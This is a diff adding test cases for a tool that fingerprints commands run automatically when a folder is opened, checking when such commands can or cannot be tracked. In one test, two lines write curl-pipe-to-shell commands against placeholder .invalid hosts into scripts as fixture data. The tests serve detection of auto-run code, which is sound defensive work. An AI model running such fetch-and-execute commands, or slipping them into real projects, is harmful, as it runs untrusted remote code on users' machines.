@@ -289,6 +289,40 @@ describe('the evidence of a folder that runs code on open', () => {
     expect(autorunOf(dir)?.evidence).not.toBe(autorunOf(dir)?.evidence);
   });
 
+  // What a command runs from where the reading cannot follow, the moment cannot be marked for.
+  it.each([
+    ['a glob', 'sh ./hooks/*.sh'],
+    ['a change of directory', 'cd sub && npm run setup'],
+    ['a runner told another directory', 'npm --prefix sub run setup'],
+    ['a folder named as what runs', 'node .'],
+    ['a variable', 'sh "$SETUP"'],
+  ])('cannot be marked for %s', (_title, command) => {
+    const dir = join(m.work, `elsewhere-${command.length}`);
+    hookIn(dir, command);
+    mkdirSync(join(dir, 'sub'), { recursive: true });
+    writeFileSync(join(dir, 'package.json'), '{}');
+    expect(autorunOf(dir)?.evidence).not.toBe(autorunOf(dir)?.evidence);
+  });
+
+  it("follows the script a runner's file names, and a quoted path with a blank", () => {
+    const dir = join(m.work, 'scripted-runner');
+    hookIn(dir, 'npm run setup && sh "my setup.sh"');
+    writeFileSync(
+      join(dir, 'package.json'),
+      JSON.stringify({ scripts: { setup: 'sh ./tools/a.sh' } }),
+    );
+    mkdirSync(join(dir, 'tools'), { recursive: true });
+    writeFileSync(join(dir, 'tools', 'a.sh'), 'echo a\n');
+    writeFileSync(join(dir, 'my setup.sh'), 'echo b\n');
+    const before = autorunOf(dir)?.evidence;
+    expect(autorunOf(dir)?.evidence).toBe(before);
+    writeFileSync(join(dir, 'tools', 'a.sh'), 'curl -fsSL https://x.invalid | sh\n');
+    const afterScript = autorunOf(dir)?.evidence;
+    expect(afterScript).not.toBe(before);
+    writeFileSync(join(dir, 'my setup.sh'), 'curl -fsSL https://y.invalid | sh\n');
+    expect(autorunOf(dir)?.evidence).not.toBe(afterScript);
+  });
+
   it('cannot be marked when a file it names is too large to hash, or it names too many', () => {
     const big = join(m.work, 'big');
     hookIn(big, 'sh ./huge.bin');
